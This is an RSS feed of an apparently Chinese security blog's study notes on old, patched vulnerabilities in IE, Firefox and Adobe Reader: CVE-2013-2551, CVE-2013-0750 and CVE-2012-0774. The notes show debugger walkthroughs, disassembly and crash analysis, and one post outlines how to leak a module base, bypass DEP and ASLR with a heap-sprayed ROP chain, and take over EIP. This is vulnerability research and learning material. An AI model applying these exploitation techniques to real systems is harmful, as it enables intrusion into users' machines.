<?xml version="1.0" encoding="UTF-8"?>
<rss version="2.0" xmlns:atom="https://www.w3.org/2005/Atom">
  <channel>
    <title>quanyechavshuo</title>
    <description>A blog about programming and network security</description>
    <link>http://localhost:4000/</link>
    <atom:link href="http://localhost:4000/feed.xml" rel="self" type="application/rss+xml" />
    <pubDate>Tue, 10 Jan 2017 15:41:33 +0800</pubDate>
    <lastBuildDate>Tue, 10 Jan 2017 15:41:33 +0800</lastBuildDate>
    <generator>Jekyll v3.3.1</generator>
    
      <item>
        <title>Double Free漏洞</title>
        <description>&lt;h3 id=&quot;0x00-link&quot;&gt;0x00 Link&lt;/h3&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;1.Double Free浅析
http://php.ph/wydrops/drops/Double%20Free%E6%B5%85%E6%9E%90.pdf
2.freenote_x64堆漏洞double free利用
http://fanrong1992.github.io/2016/05/26/freenote-x64%E5%A0%86%E6%BC%8F%E6%B4%9Edouble-free%E5%88%A9%E7%94%A8/
3.freebuf CVE-2014-0502分析
http://www.freebuf.com/articles/network/27118.html
4.上面3中内含的Corelan ROPdb[基于单个dll收集通用rop链]
https://www.corelan.be/index.php/security/corelan-ropdb/    
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;h3 id=&quot;0x01&quot;&gt;0x01&lt;/h3&gt;
</description>
        <pubDate>Mon, 09 Jan 2017 00:00:00 +0800</pubDate>
        <link>http://3xp10it.cc/%E4%BA%8C%E8%BF%9B%E5%88%B6/2017/01/09/Double-Free%E6%BC%8F%E6%B4%9E/</link>
        <guid isPermaLink="true">http://localhost:4000/%E4%BA%8C%E8%BF%9B%E5%88%B6/2017/01/09/Double-Free%E6%BC%8F%E6%B4%9E/</guid>
        
        <category>漏洞战争</category>
        
        
        <category>二进制</category>
        
      </item>
    
      <item>
        <title>漏洞战争-cve-2013-2551</title>
        <description>&lt;h3 id=&quot;0x00-about&quot;&gt;0x00 About&lt;/h3&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;漏洞源:vgx.dll在处理&amp;lt;v:stroke&amp;gt;标签的dashstyle.array.length属性时,没有对传入的参数进行完备验证而导致整数溢出
调试环境:
    win7
good knowledge:
    http://www.isclab.org.cn/archives/2014/11/2830.html
    http://www.voidcn.com/blog/tony_whu/article/p-4307461.html
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;h3 id=&quot;0x01-分析&quot;&gt;0x01 分析&lt;/h3&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;poc中关键处为:
    vml1.dashstyle=&quot;1 2 3 4 ... 44&quot;
    vml1.dashstyle.array.length=0-1
    shape.dashstyle.array.length=0-1
也即在设置dashstyle.array.length时,由原来的44变成了-1,这样导致了整数溢出漏洞,产生了数组越界访问的读写能力,而
COARuntimeStyle对象偏移0x58处为可控字符串指针,可以将可控字符串设置成AAAAAA,书中poc中为:a[i].marginLeft=&quot;a&quot;
这样就可以通过动态调试中找到内存中AAAAAA与模块基址的偏移量,从而由AAAAAA的内存地址减去该偏移量得到aslr下的模块的
基址,由此基址可通过heap spray构造rop gadgets绕过dep+aslr,然后再次利用数组越界访问的读写能力改写对象的虚表指针就
可以控制eip了

通过poc分析这个整数溢出漏洞的溢出细节可这样实现:
1)找到poc中关键的代码:vml1.dashstyle.array.length=0-1
2)通过ida中的&quot;Functions Windows&quot;中按&quot;alt+t&quot;组合键找到1)中对应的dll中的对应类的函数:
    vgx.dll中的COALineDashStyleArray类中的put_length函数
3)windbg中bu vgx!COALineDashStyleArray::put_length
4)单步调试分析汇编指令(细心活):
    分析得到导致整数溢出的关键点在
        mov esi,dword ptr [ebp+0Ch] ss:0023:040fa190=ffffffff  //获取到dashstyle数组长度值0xFFFFFFFF
        cmp eax,esi //与poc中原来设置的dashstyle数组长度0x2C做比较,大于等于则跳转
        jge vgx!COALineDashStyleArray::put_length+0xca处 //口诀:AB无符号,GL有符号,此处为g(有符号比较),导致漏洞
        的产生

&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;
</description>
        <pubDate>Tue, 27 Dec 2016 00:00:00 +0800</pubDate>
        <link>http://3xp10it.cc/%E4%BA%8C%E8%BF%9B%E5%88%B6/2016/12/27/%E6%BC%8F%E6%B4%9E%E6%88%98%E4%BA%89-cve-2013-2551/</link>
        <guid isPermaLink="true">http://localhost:4000/%E4%BA%8C%E8%BF%9B%E5%88%B6/2016/12/27/%E6%BC%8F%E6%B4%9E%E6%88%98%E4%BA%89-cve-2013-2551/</guid>
        
        <category>漏洞分析</category>
        
        <category>整数溢出</category>
        
        
        <category>二进制</category>
        
      </item>
    
      <item>
        <title>漏洞战争-cve-2013-0750</title>
        <description>&lt;h3 id=&quot;0x00-prepare&quot;&gt;0x00 Prepare&lt;/h3&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;1.firefox17.0下载链接
ftp://ftp.mozilla.org/pub/mozilla.org/firefox/releases/17.0/win32/zh-CN/Firefox%20Setup%2017.0.exe
2.firefox 17.0源码下载链接
http://releases.mozilla.org/pub/mozilla.org/firefox/releases/17.0/source/firefox-17.0.source.tar.bz2
3.firefox官方符号表服务器地址(在windbg中添加File|Symbol File Path)
SRV*c:\symbollocal\*http://symbols.mozilla.org/firefox
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;h3 id=&quot;0x01-分析&quot;&gt;0x01 分析&lt;/h3&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;windbg|File|Symbol File Path|在最后添加;SRV*d:\symbollocal\*http://symbols.mozilla.org/firefox
windbg|File|添加资源文件路径C:\Users\klionsec7\Desktop\mozilla-release
打开firefox17.0
f6附加firefox.exe
g
firefox打开poc.html
    (ae4.131c): Access violation - code c0000005 (first chance)
    First chance exceptions are reported before any exception handling.
    This exception may be expected and handled.
    eax=14405418 ebx=002dbbd8 ecx=002e1000 edx=14600000 esi=002dbb80 edi=072b0031
    eip=693c2aa3 esp=002dba68 ebp=002dbaa0 iopl=0         nv up ei ng nz na pe cy
    cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00010287
    *** WARNING: Unable to verify checksum for C:\Program Files (x86)\Mozilla Firefox\mozjs.dll
    *** ERROR: Symbol file could not be found.  Defaulted to export symbols for C:\Program Files (x86)\Mozilla 
    Firefox\mozjs.dll - 
    mozjs!js::NewProxyObject+0x1043:
    693c2aa3 668939          mov     word ptr [ecx],di        ds:002b:002e1000=????     
    这里得到的中断下来的信息与书中不一致,这里得到的符号表对应的结果为mozjs!js::NewProxyObject+0x1043,书中得到的
    结果为mozjs!ReplaceRegExpCallback+0x183,对应的汇编指令都是:mov word ptr [ecx],di
    上面显示没有找到符号文件,查看当前符号路径,使用如下命令

.sympath
    0:000&amp;gt; .sympath
    Symbol search path is: srv*c:symbols*http://msdl.microsoft.com/download/symbols   
    结果中没有开始设置的firefox的符号表服务器地址,不知什么原因,调试器默认采用延迟模式加载符号,重新打开windbg,使
    用如下命令添加firefox的符号表路径

f6附加firefox.exe
.sympath+ SRV*c:\symbollocal\*http://symbols.mozilla.org/firefox
.sympath    
    Symbol search path is: srv*c:symbols*http://msdl.microsoft.com/download/symbols;
    SRV*c:\symbollocal\*http://symbols.mozilla.org/firefox
.reload
    这里如果不.reload依然会找不到符号表,可参考如下链接
    http://www.cnblogs.com/kissdodog/p/3729396.html
g
firefox打开poc.html
    (984.a00): Access violation - code c0000005 (first chance)
    First chance exceptions are reported before any exception handling.
    This exception may be expected and handled.
    eax=0d4040d8 ebx=0045bf18 ecx=00460000 edx=0d600000 esi=0045bec0 edi=02200031
    eip=6d752aa3 esp=0045bda8 ebp=0045bde0 iopl=0         nv up ei ng nz na pe cy
    cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00010287
    *** WARNING: Unable to verify checksum for C:\Program Files (x86)\Mozilla Firefox\mozjs.dll
    mozjs!ReplaceRegExpCallback+0x183:
    6d752aa3 668939          mov     word ptr [ecx],di        ds:002b:00460000=0000
kv
    ChildEBP RetAddr  Args to Child              
    0045bde0 6d799af8 05115710 0804d200 00000000 mozjs!ReplaceRegExpCallback+0x183 (FPO: [Non-Fpo]) 
    [e:\builds\moz2_slave\rel-m-rel-w32-bld\build\js\src\jsstr.cpp @ 2099]
    0045be10 6d79a333 00000001 0845f8e0 6d752920 mozjs!DoMatch+0xc8 (FPO: [Non-Fpo]) 
    [e:\builds\moz2_slave\rel-m-rel-w32-bld\build\js\src\jsstr.cpp @ 1694]
    0045be4c 6d7451e1 0045bec0 05410078 00000002 mozjs!str_replace_regexp+0x83 (FPO: [Non-Fpo]) 
    [e:\builds\moz2_slave\rel-m-rel-w32-bld\build\js\src\jsstr.cpp @ 2278]
    *** WARNING: Unable to verify checksum for C:\Program Files (x86)\Mozilla Firefox\firefox.exe
    0045bf6c 00310031 00310031 00310031 00310031 mozjs!js::str_replace+0x261 (FPO: [Non-Fpo]) 
    [e:\builds\moz2_slave\rel-m-rel-w32-bld\build\js\src\jsstr.cpp @ 2464]
    0045bf7c 00310031 00310031 00310031 00310031 firefox!__dyn_tls_init_callback &amp;lt;PERF&amp;gt; (firefox+0xb0031)
    0045bf80 00310031 00310031 00310031 00310031 firefox!__dyn_tls_init_callback &amp;lt;PERF&amp;gt; (firefox+0xb0031)
    0045bf84 00310031 00310031 00310031 00310031 firefox!__dyn_tls_init_callback &amp;lt;PERF&amp;gt; (firefox+0xb0031)
    0045bf88 00310031 00310031 00310031 00310031 firefox!__dyn_tls_init_callback &amp;lt;PERF&amp;gt; (firefox+0xb0031)
    0045bf8c 00310031 00310031 00310031 00310031 firefox!__dyn_tls_init_callback &amp;lt;PERF&amp;gt; (firefox+0xb0031)
    0045bf90 00310031 00310031 00310031 00310031 firefox!__dyn_tls_init_callback &amp;lt;PERF&amp;gt; (firefox+0xb0031)
    0045bf94 00310031 00310031 00310031 00310031 firefox!__dyn_tls_init_callback &amp;lt;PERF&amp;gt; (firefox+0xb0031)
    0045bf98 00310031 00310031 00310031 00310031 firefox!__dyn_tls_init_callback &amp;lt;PERF&amp;gt; (firefox+0xb0031)
    0045bf9c 00310031 00310031 00310031 00310031 firefox!__dyn_tls_init_callback &amp;lt;PERF&amp;gt; (firefox+0xb0031)
    0045bfa0 00310031 00310031 00310031 00310031 firefox!__dyn_tls_init_callback &amp;lt;PERF&amp;gt; (firefox+0xb0031)
    0045bfa4 00310031 00310031 00310031 00310031 firefox!__dyn_tls_init_callback &amp;lt;PERF&amp;gt; (firefox+0xb0031)
    0045bfa8 00310031 00310031 00310031 00310031 firefox!__dyn_tls_init_callback &amp;lt;PERF&amp;gt; (firefox+0xb0031)
    0045bfac 00310031 00310031 00310031 00310031 firefox!__dyn_tls_init_callback &amp;lt;PERF&amp;gt; (firefox+0xb0031)
    0045bfb0 00310031 00310031 00310031 00310031 firefox!__dyn_tls_init_callback &amp;lt;PERF&amp;gt; (firefox+0xb0031)
    0045bfb4 00310031 00310031 00310031 00310031 firefox!__dyn_tls_init_callback &amp;lt;PERF&amp;gt; (firefox+0xb0031)
    0045bfb8 00310031 00310031 00310031 00310031 firefox!__dyn_tls_init_callback &amp;lt;PERF&amp;gt; (firefox+0xb0031)
    kv命令的结果中可以看到源码文件是jsstr.cpp,这里的kv的结果中的jsstr.cpp的路径并不是实际系统中的路径,可能是
    windbg的bug,在本地磁盘中全局搜索jsstr.cpp文件,找到后用windbg打开[文件|打开源文件|]这时可以看到windbg中新出
    现了一个源代码的面板,如果不手动打开,windbg不能自己找到,源代码面板中定位到如下位置:
        
    static bool
    ReplaceRegExpCallback(JSContext *cx, RegExpStatics *res, size_t count, void *p)
    {
        ReplaceData &amp;amp;rdata = *static_cast&amp;lt;ReplaceData *&amp;gt;(p);

        rdata.calledBack = true;
        size_t leftoff = rdata.leftIndex;
        size_t leftlen = res-&amp;gt;matchStart() - leftoff;
        rdata.leftIndex = res-&amp;gt;matchLimit();

        size_t replen = 0;  /* silence 'unused' warning */
        if (!FindReplaceLength(cx, res, rdata, &amp;amp;replen))
            return false;

        size_t growth = leftlen + replen;
        if (!rdata.sb.reserve(rdata.sb.length() + growth))
            return false;

        JSLinearString &amp;amp;str = rdata.str-&amp;gt;asLinear();  /* flattened for regexp */
        const jschar *left = str.chars() + leftoff;

        rdata.sb.infallibleAppend(left, leftlen); /* skipped-over portion of the search value */
        DoReplace(cx, res, rdata);定位到的位置
        return true;
    }
    windbg的源代码面板定位到上面的DoReplace语句处,但是由于缺乏相应版本的符号表,在源码调试中无法直接定位到异常指
    令对应的是DoReplace的哪一句代码.从windbg上设置的符号表服务器地址上对应的符号表一般都是最新的firefox版本的符
    号表,这里调试的firefox的版本是17.0,并不是当前最新版本,所以找不到DoReplace中具体代码位置,为了解决这个问题需
    要自动编译firefox17.0的源码.
    编译需要用到:http://ftp.mozilla.org/pub/mozilla/libraries/win32/中的mozillabuildsetup1.7,eg.将
    mozillabuildsetup1.7安装到C:\mozilla-build\,然后将firefox源码中的xulrunner\config目录复制到
    c:\mozilla-build下,在c:\mozilla-build\config\mozconfig文件中设置如下:

    ac_add_options --enable-application=browser
    ac_add_options --enable-debug
    ac_add_options --enable-tests
    ac_add_options -trace-malloc
    ac_add_options --disable-webgl
    打开mozzillabuildsetup安装目录下的start-msvc10.bat来启动vs2010后,进入mozilla源码目录,执行make -f client.mk
    build.
    系统需要安装vs2010,这里不再继续,分析至此.


&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;
</description>
        <pubDate>Mon, 26 Dec 2016 00:00:00 +0800</pubDate>
        <link>http://3xp10it.cc/%E4%BA%8C%E8%BF%9B%E5%88%B6/2016/12/26/%E6%BC%8F%E6%B4%9E%E6%88%98%E4%BA%89-cve-2013-0750/</link>
        <guid isPermaLink="true">http://localhost:4000/%E4%BA%8C%E8%BF%9B%E5%88%B6/2016/12/26/%E6%BC%8F%E6%B4%9E%E6%88%98%E4%BA%89-cve-2013-0750/</guid>
        
        <category>漏洞分析</category>
        
        <category>源码调试</category>
        
        
        <category>二进制</category>
        
      </item>
    
      <item>
        <title>漏洞战争-cve-2012-0774</title>
        <description>&lt;h3 id=&quot;0x00-prepare&quot;&gt;0x00 Prepare&lt;/h3&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;1.adobe reader 9.4.0
2.immunity debugger
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;h3 id=&quot;0x01-分析&quot;&gt;0x01 分析&lt;/h3&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;打开adobe reader,od附加
f9
adobe reader中打开poc.pdf
    adobe reader崩溃,但是od无法捕获异常,换成immunity debugger可捕获异常位置

重新打开reader,immunity debugger附加
f9
reader打开poc.pdf,异常捕获,中断如下:
    6DD979C9   8D71 04          LEA ESI,DWORD PTR DS:[ECX+4]
    6DD979CC   8B1E             MOV EBX,DWORD PTR DS:[ESI]
    6DD979CE   8919             MOV DWORD PTR DS:[ECX],EBX
    6DD979D0   8BCE             MOV ECX,ESI
    6DD979D2  ^75 F4            JNZ SHORT CoolType.6DD979C8
    6DD979D4   83E8 04          SUB EAX,4
    中断位置为6dd979ce处的MOV DWORD PTR DS:[ECX],EBX,immunity debugger中下面状态栏中显示:access violation when
    wring to 6dfcf000,也即[ecx]所在内存空间不可写,因此导致崩溃，从当前堆栈窗口中找出最上面的return to的地址,右
    键在反汇编窗口跟随,得到当前的6dd979ce处的指令在如下call 调用的函数帧空间中:

    6DD96956   50               PUSH EAX
    6DD96957   FF148D D0BEFA6D  CALL DWORD PTR DS:[ECX*4+6DFABED0]       ; vulfunc
    6DD9695E   59               POP ECX
    将6dd96957处的调用标记为vulfunc,现在要在6dd96957处下断点并查看这个调用过程,但是有aslr机制,重新下断时这里不
    再会是6dd96957,需算出6dd96957与当前dll的偏移再根据偏移在重新运行reader后下断点,alt+e:
    
    Executable modules, item 22
    Base=6DD90000
    Size=0025F000 (2486272.)
    Entry=6DDD866B CoolType.&amp;lt;ModuleEntryPoint&amp;gt;
    Name=CoolType
    File version=5.05.73.1
    Path=C:\Program Files (x86)\Adobe\Reader 9.0\Reader\CoolType.dll
    在alt+e窗口中得到vulfunc在CoolType.dll中,且vulfunc在CoolType.dll中的内存偏移为:6dd96957-6dd90000=6957

重新打开reader并用immu附加,f9,alt+e,发现cooltype.dll的基址不变,仍然是6dd90000,那么前面一步的计算偏移就是多余的
了,看来泉哥在这里的想法不完全正确,这里不用算偏移,应该是操作系统没有为cooltype.dll开aslr.可直接在6dd96957处下断.
后来发现是自己错了,重新运行reader并用immu附加后cooltype.dll的地址会是6dd90000或是69360000,eg.第一次运行reader并
用immu附加后cooltype.dll的基址为6dd90000,关闭reader和immu后,第二次运行reader并用immu附加后cooltype.dll的基址为
69360000,第三次又变回6dd90000,第四次则为69360000,...以此交替.说明cooltype.dll还是开了aslr的.继续用偏移的方法下
断点,重新打开reader,immu附加,第一次cooltype.dll的基址为6dd90000,第二次为69360000,此时在69360000+6957=69366957处
下断

ctrl+g:69366957
f2
    69366955   51               PUSH ECX
    69366956   50               PUSH EAX
    69366957   FF148D D0BE5769  CALL DWORD PTR DS:[ECX*4+6957BED0]
    6936695E   59               POP ECX
    6936695F   59               POP ECX

在69366957处shift+f4下条件记录断点,记录ecx(ecx是虚拟指令索引号),设置为不中断,explanation设成:&quot;index ecx&quot;,
expression设成:&quot;ecx&quot;

f9
reader打开poc.pdf
    再次崩溃,由immu捕获崩溃,与上次崩溃信息相同,得到log面板中日志如下:

    ...
    ...
    ...
    ...
    69366957   COND: index ecx = 00000041
    69366957   COND: index ecx = 00000063
    69366957   COND: index ecx = 00000060
    69366957   COND: index ecx = 00000041
    69366957   COND: index ecx = 00000043
    69366957   COND: index ecx = 000000B0
    69366957   COND: index ecx = 00000061
    69366957   COND: index ecx = 00000042
    69366957   COND: index ecx = 00000043
    69366957   COND: index ecx = 00000078
    69366957   COND: index ecx = 00000041
    69366957   COND: index ecx = 00000063
    69366957   COND: index ecx = 00000060
    69366957   COND: index ecx = 00000041
    69366957   COND: index ecx = 00000043
    69366957   COND: index ecx = 000000B0
    69366957   COND: index ecx = 00000061
    69366957   COND: index ecx = 00000042
    69366957   COND: index ecx = 00000043
    69366957   COND: index ecx = 00000078
    69366957   COND: index ecx = 00000041
    69366957   COND: index ecx = 00000060
    69366957   COND: index ecx = 00000060
    69366957   COND: index ecx = 00000026
    693679CE   [18:15:48] Access violation when writing to [6959F000]
    说明是索引号为26的call调用造成了access violation,设置条件断点:当ecx为26时中断

重新打开reader并用immu附加,这次cooltype.dll基址为6dd90000,6dd90000+6957=6dd96957,ctrl+g:6dd96957
    6DD96955   51               PUSH ECX
    6DD96956   50               PUSH EAX
    6DD96957   FF148D D0BEFA6D  CALL DWORD PTR DS:[ECX*4+6DFABED0]       ; vulfunc
    6DD9695E   59               POP ECX
    6DD9695F   59               POP ECX
    6DD96960   3BC6             CMP EAX,ESI

在6dd96957上设置条件断点,shift+f2,设置断点条件为ecx==26
f9
reader打开poc.pdf
    成功中断到6dd96957处,且ecx=26,f7跟进call,汇编指令如下:

    6DD9798B   A1 E023FC6D      MOV EAX,DWORD PTR DS:[6DFC23E0]
    6DD97990   8B0D EC23FC6D    MOV ECX,DWORD PTR DS:[6DFC23EC]
    6DD97996   53               PUSH EBX
    6DD97997   56               PUSH ESI
    6DD97998   8B31             MOV ESI,DWORD PTR DS:[ECX]
    6DD9799A   8D50 FC          LEA EDX,DWORD PTR DS:[EAX-4]
    6DD9799D   3BD6             CMP EDX,ESI
    6DD9799F   57               PUSH EDI
    6DD979A0   72 45            JB SHORT CoolType.6DD979E7
    6DD979A2   8BB9 54010000    MOV EDI,DWORD PTR DS:[ECX+154]
    6DD979A8   3BD7             CMP EDX,EDI
    6DD979AA   73 3B            JNB SHORT CoolType.6DD979E7
    6DD979AC   83C0 FC          ADD EAX,-4
    6DD979AF   8B10             MOV EDX,DWORD PTR DS:[EAX]
    6DD979B1   8BDA             MOV EBX,EDX
    6DD979B3   C1E3 02          SHL EBX,2
    6DD979B6   8BC8             MOV ECX,EAX
    6DD979B8   2BCB             SUB ECX,EBX
    6DD979BA   3BCE             CMP ECX,ESI
    6DD979BC   72 29            JB SHORT CoolType.6DD979E7
    6DD979BE   3BCF             CMP ECX,EDI
    6DD979C0   73 25            JNB SHORT CoolType.6DD979E7
    6DD979C2   85D2             TEST EDX,EDX
    6DD979C4   8B39             MOV EDI,DWORD PTR DS:[ECX]
    6DD979C6   7E 0F            JLE SHORT CoolType.6DD979D7
    6DD979C8   4A               DEC EDX
    6DD979C9   8D71 04          LEA ESI,DWORD PTR DS:[ECX+4]
    6DD979CC   8B1E             MOV EBX,DWORD PTR DS:[ESI]
    6DD979CE   8919             MOV DWORD PTR DS:[ECX],EBX
    6DD979D0   8BCE             MOV ECX,ESI
    6DD979D2  ^75 F4            JNZ SHORT CoolType.6DD979C8
    6DD979D4   83E8 04          SUB EAX,4
    6DD979D7   8938             MOV DWORD PTR DS:[EAX],EDI
    6DD979D9   83C0 04          ADD EAX,4
    6DD979DC   A3 E023FC6D      MOV DWORD PTR DS:[6DFC23E0],EAX
    6DD979E1   8B4424 10        MOV EAX,DWORD PTR SS:[ESP+10]
    6DD979E5   EB 0F            JMP SHORT CoolType.6DD979F6
    6DD979E7   A1 3824FC6D      MOV EAX,DWORD PTR DS:[6DFC2438]
    6DD979EC   C705 3424FC6D 10&amp;gt;MOV DWORD PTR DS:[6DFC2434],1110
    6DD979F6   5F               POP EDI
    6DD979F7   5E               POP ESI
    6DD979F8   5B               POP EBX
    6DD979F9   C3               RETN
    此时eip=6dd9768b,单步跟踪

f8
f8
...
eip=6dd979b3
    此时汇编指令为shl ebx,2,寄存器值如下:

    EAX 6DFC622C CoolType.6DFC622C
    ECX 0577E4E4
    EDX 40000001
    EBX 40000001
    ESP 0014CA20
    EBP 0014CAB4
    ESI 6DFC6220 ASCII &quot;AA&quot;
    EDI 6DFC6344 ASCII &quot;tnfs&quot;
    EIP 6DD979B3 CoolType.6DD979B3
    这里的ebx为0x40000001,shl ebx,2之后得到ebx=0x40000001*4=0x100000004=0x00000004,导致整数溢出,再继续单步跟踪
    到6DD979CE处的MOV DWORD PTR DS:[ECX],EBX应该会出现前面一样的access violation,reader崩溃.

f8
...
eip=6dd979ce
    此时并没有崩溃,因为在6dd979c8到6dd979d2为一个循环,会在这个循环中的某一次中出现access violation使得reader崩
    溃,0x40000001是溢出的关键,它完全是由虚拟指令操作实现的.为了看清0x40000001是怎么出现的,需要知道每个虚拟指令
    索引号对应的call中的汇编指令效果,于是对溢出前的每个虚拟指令索引号对应的CALL DWORD PTR DS:[ECX*4+6DFABED0]
    设置条件记录断点,记录call前与call后虚拟栈顶vm_esp的值及虚拟指令.这里的虚拟栈顶vm_esp并不是指esp中的数据,这
    里的虚拟指令类似于java的虚拟机指令,是&quot;虚拟的&quot;,并不是真实栈中的数据,而是对虚拟指令而言的&quot;虚拟栈&quot;,如B0 01虚拟
    指令对应将1压栈的动作,这里的压栈是对虚拟指令而言的栈,并不是真实的esp中的栈,要想得到&quot;虚拟栈&quot;中的数据,需要得到
    &quot;虚拟栈&quot;对应的真实内存地址,跟踪B0 01虚拟指令的CALL DWORD PTR DS:[ECX*4+6DFABED0]的处理情况,进行如下操作

重新打开read并用immu附加,这次cooltype.dll的基址为69360000,ctrl+g:69366957,在69366957处下条件断点,设置条件为
ecx=0xB0

f9
reader打开poc.pdf
    成功中断在ecx=b0情况下,对应call的函数帧中指令如下:
            
    69368B05   A1 E0235969      MOV EAX,DWORD PTR DS:[695923E0]
    69368B0A   8B15 EC235969    MOV EDX,DWORD PTR DS:[695923EC]
    69368B10   8D48 04          LEA ECX,DWORD PTR DS:[EAX+4]
    69368B13   3B8A 54010000    CMP ECX,DWORD PTR DS:[EDX+154]
    69368B19   77 18            JA SHORT CoolType.69368B33
    69368B1B   3B0A             CMP ECX,DWORD PTR DS:[EDX]
    69368B1D   76 14            JBE SHORT CoolType.69368B33
    69368B1F   8B4C24 04        MOV ECX,DWORD PTR SS:[ESP+4]
    69368B23   0FB611           MOVZX EDX,BYTE PTR DS:[ECX]
    69368B26   8910             MOV DWORD PTR DS:[EAX],EDX
    69368B28   8305 E0235969 04 ADD DWORD PTR DS:[695923E0],4
    69368B2F   8D41 01          LEA EAX,DWORD PTR DS:[ECX+1]
    69368B32   C3               RETN
    由于B0 01虚拟指令对应的虚拟动作是将1压栈,现在要找到1所在的真实内存位置,f8单步

f8
...
...
f8
eip=69368b26时,edx=1,[eax]=1,对应&quot;虚拟栈顶&quot;vm_esp中的数据
f8
eip=69368b28时,此时已经将1赋值给[eax],此时可以看到[695923e0]=69596240=eax
f8
    eip=69368b2f,此时已经执行完ADD DWORD PTR DS:[695923E0],4,后面再f8再次就执行完call了,执行完call之后要想得到
    &quot;虚拟栈顶&quot;vm_esp中的数据的方法为:查看真实内存中的值[[695923e0]-4],所以要想得到溢出前每个索引对应的call在
    call执行前与call执行后虚拟栈顶的值及虚拟指令,则需要设置条件记录断点,并设置expression为:&quot;[[695923e0]-4]&quot;,为
    了观察更多,也记录vm_esp-4中的数据,并在call调用前和调用后分别记录,也即最后这样设置:
    在call的上一句指令处设置条件记录断点,并设置explanation为:&quot;执行前[vm_esp]&quot;,设置expression为:&quot;[[695923e0]-4]&quot;
    在call的上一句指令处设置条件记录断点,并设置explanation为:&quot;执行前[vm_esp-4],设置expression为&quot;[[695923e0]-8]&quot;
    在call指令处设置条件记录断点,并设置explanation为:&quot;虚拟指令索引号&quot;,设置expression为&quot;ecx&quot;
    在call的下一句指令处设置条件记录断点,并设置explanation为:&quot;执行后[vm_esp]&quot;,设置expression为:&quot;[[695923e0]-4]&quot;
    在call的下一句指令处设置条件记录断点,并设置explanation为:&quot;执行后[vm_esp-4],设置expression为&quot;[[695923e0]-8]&quot;
    上面5个设置中都设置不中断且记录expression的值

重新打开read并用immu附加,此时cooltype.dll基址为6dd90000,关键call调用的地址为6dd96957   
ctrl+g:6dd96957,按照上面的5个设置条件记录断点之后便可得到书中对应log记录,再通过分析log得到0x40000001的来源过程.
需注意要在32位系统上调试,如果在64位系统上调试应该设置explanation为vm_esp和vm_esp-8,expression对应为
[[695923e0]-4]和[[695923e0]-0xc].

&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;
</description>
        <pubDate>Sun, 25 Dec 2016 00:00:00 +0800</pubDate>
        <link>http://3xp10it.cc/%E4%BA%8C%E8%BF%9B%E5%88%B6/2016/12/25/%E6%BC%8F%E6%B4%9E%E6%88%98%E4%BA%89-cve-2012-0774/</link>
        <guid isPermaLink="true">http://localhost:4000/%E4%BA%8C%E8%BF%9B%E5%88%B6/2016/12/25/%E6%BC%8F%E6%B4%9E%E6%88%98%E4%BA%89-cve-2012-0774/</guid>
        
        <category>漏洞分析</category>
        
        <category>整数溢出</category>
        
        
        <category>二进制</category>
        
      </item>
    
      <item>
        <title>od命令</title>
        <description>&lt;h3 id=&quot;0x01-od知识&quot;&gt;0x01 OD知识&lt;/h3&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;1&amp;gt;od调试常见断点及原理
    http://blog.csdn.net/qq_20977145/article/details/52687730
2&amp;gt;条件断点,条件记录断点
    http://blog.csdn.net/hgy413/article/details/7711925
    条件断点:shift+f2
    条件记录断点:shift+f4
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;h3 id=&quot;0x02-od技巧&quot;&gt;0x02 OD技巧&lt;/h3&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;1&amp;gt;如果有aslr,要调试某个exe,漏洞函数在某个dll中,可以先加载dll,然后在dll中的漏洞函数下断点,然后再加载要调试的exe
主程序,这样或许可以避开aslr对dll模块基址改变带来的问题从而更好地下断点,未实践.
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;
</description>
        <pubDate>Sun, 25 Dec 2016 00:00:00 +0800</pubDate>
        <link>http://3xp10it.cc/crack/2016/12/25/od%E5%91%BD%E4%BB%A4/</link>
        <guid isPermaLink="true">http://localhost:4000/crack/2016/12/25/od%E5%91%BD%E4%BB%A4/</guid>
        
        <category>od</category>
        
        
        <category>crack</category>
        
      </item>
    
      <item>
        <title>漏洞战争-cve-2011-0027</title>
        <description>&lt;h3 id=&quot;0x00-about&quot;&gt;0x00 About&lt;/h3&gt;

&lt;p&gt;漏洞情况:&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;MDAC是一套用于在windows上提供数据库连接的组件,由于MDAC没有正确验证内部数据结构的内存分配,当RecordSet中用于
指定缓冲区大小的CacheSize属性过大时会导致整数溢出,造成实际分配的内存空间小于原来指定的内存空间.
荷兰黑客Peter Vreugdenhil在Pwn2Own 2010中利用cve-2011-0027 Microsoft Data Access Components(MDAC)的堆溢出漏
洞攻破了Windows7上的IE8,利用信息泄露和rop绕过aslr和dep的保护,赢得高额奖金. 微软于2011年1月补丁日修复这个漏
洞,对应微软信息安全公告MS11-002
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;准备:&lt;/p&gt;

